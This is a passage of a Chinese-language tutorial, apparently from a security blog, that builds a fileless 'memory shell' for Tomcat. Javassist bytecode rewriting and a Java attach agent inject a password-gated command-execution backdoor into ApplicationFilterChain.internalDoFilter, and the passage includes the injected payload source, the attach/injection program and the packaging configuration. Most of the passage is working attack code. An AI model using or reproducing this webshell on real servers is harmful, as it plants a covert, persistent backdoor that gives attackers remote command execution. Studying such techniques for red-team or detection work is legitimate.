    //                System.out.println("classBeingRedefinefined is :"+classBeingRedefined.getName());// classBeingRedefined = null
                    ClassClassPath classPath = new ClassClassPath(className.getClass());  //get className class's classpath
    //                System.out.println("this class path :"+classPath.toString())    ;
                    classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
    //                System.out.println("classPool has :"+classPool.toString());
                    if (classBeingRedefined!=null) //for avoide case of null, throw exception
                    {
                        ClassClassPath classPath1 = new ClassClassPath(classBeingRedefined);
                        classPool.insertClassPath(classPath1);
                    }
                    CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //for xx.xx.xx
                    CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");//filterchain dofilter actually implementation ,change it'code and for all request
                    ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
                    ctMethod.insertBefore(readSource());//insert the code for cmd
                    byte [] classbytes =ctClass.toBytecode();//get changed code and return ,Notice  after the  method of  toBytecode,the ctClass will be forzen
                    /*
                    try get fileclass
                     */
                    bytestoclass(classbytes,".\\tmp\\retransformed.class");//get changed class for check
                    return classbytes;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return  null;
        }
        /**
         * get the code ready for inject internalDoFilter
         * @return ready code
         */
        private String readSource() {
            StringBuilder source=new StringBuilder();
            InputStream is = Transformerthings.class.getClassLoader().getResourceAsStream("source.txt");
            InputStreamReader isr = new InputStreamReader(is);
            String line=null;
            try {
                BufferedReader br = new BufferedReader(isr);
                while((line=br.readLine()) != null) {
                    source.append(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return source.toString();
        }
        /**
         * output file for check
         * @param bytes
         * @param filename
         */
        private void bytestoclass(byte [] bytes,String filename) {
            try{
                File file = new File(".\\tmp");
                if (!file.exists())
                    file.mkdir();
                FileOutputStream fos = new FileOutputStream(filename);
                fos.write(bytes);
                fos.flush();
                fos.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
cmd code（上面的 source.txt）:
    javax.servlet.http.HttpServletRequest request=$1; // reference for javassist
       javax.servlet.http.HttpServletResponse response = $2;
       String pwd=request.getParameter("passwod");
       String cmd=request.getParameter("cmd");
       String result="";
    try {
                System.out.println("shell connectting");
             if (pwd!=null&&pwd.equals("ga0weI"))
             {
                if (cmd==null||cmd.equals(""))
                {
                   result=priv.ga0weI.baseonagent.Shell.help();
                }
                else
                {
                   result=priv.ga0weI.baseonagent.Shell.execute(cmd);
                }
                    response.getWriter().print(result);
                    return;
                }
          }
          catch(Exception e)
          {
             response.getWriter().print(e.getMessage());
          }
Inject or Attach :
定义并实现Attachthing类，利用java
tools来实现loadagent，向jvm虚拟机的的java应用注入agent；这里我们实现的时候首先通过jps找到Tomcat的pid，因为Tomcat的启动文件叫BootStrap，而jvm中的jsp
的命名方法是通过启动文件命名，所以我们可以通过这种方式来找到其pid。
    package priv.ga0weI.baseonagent;
    import com.sun.tools.attach.VirtualMachine;
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    public class Attachthing {
        public static void main(String[] args) throws Exception {
            String pid = getpid().trim();
            System.out.println("find a Tomcat vm:"+pid);
            String currentPath = Attachthing.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
    //        System.out.println("path:"+currentPath);
            String agentFile = currentPath.substring(1,currentPath.length())+"Agent-1.0-SNAPSHOT-jar-with-dependencies.jar".replace("/","\\");
            System.out.println("agent file path :"+agentFile);
            VirtualMachine vm = VirtualMachine.attach(pid);
            vm.loadAgent(agentFile);
            vm.detach();
            System.out.println("agent injected");
        }
        /**
         * look for pid in jvm
         * @return Pid
         * @throws Exception
         */
        private static String getpid() throws Exception{
            Process ps = Runtime.getRuntime().exec("jps");
            InputStream is = ps.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader bis = new BufferedReader(isr);
            String line;
            StringBuilder sb = new StringBuilder();
            String result = null;
            while((line=bis.readLine())!=null){
                sb.append(line+";");
            }
            String  [] xx= sb.toString().split(";");
            for (String x : xx){
                if (x.contains("Bootstrap")) //find tomcat
                {
                    result=x.substring(0,x.length()-9);
                }
            }
            return result;
        }
    }
使用maven的maven-assembly-plugin插件打包:
pom.xml文件：
        4.0.0
        org.example
        Attach
        1.0-SNAPSHOT
                io.earcam.wrapped
                com.sun.tools.attach
                1.8.0_jdk8u172-b11
                org.javassist
                javassist
                3.22.0-GA
                    org.apache.maven.plugins
                    maven-assembly-plugin
                    2.4.1
                            jar-with-dependencies
                                true
                                priv.ga0weI.baseonagent.Attachthing
    -->
    priv.ga0weI.baseonagent.Agentthing-->
    true-->
    true-->
    true-->
    -->
                            make-assembly
                            package
                                single
            8
            8
注意，打包agent类的时候要使用Agent-Class标签，而且我们尽量用maven-assembly-plugin这个插件，这个插件默认能打包所有依赖。当然其他插件也可以，需要一些额外的配置配合使用。
##### 测试
打开Tomcat服务器：
将准备好的jar文件放入Tomcat服务器的根目录：
运行attach jar程序：
访问任意路径带外passwod：
带上cmd：
此时Tomcat服务器日志记录：
因为我们在注入的code里面有输出，干掉即可。从而就实现了
测试任意url:
查看修改后的字节码：
反编译：可以明显看到，该类的字的internalDofiler方法已被修改注入了任意命令执行逻辑。
至此，agent类型的任意通用内存马实现完成；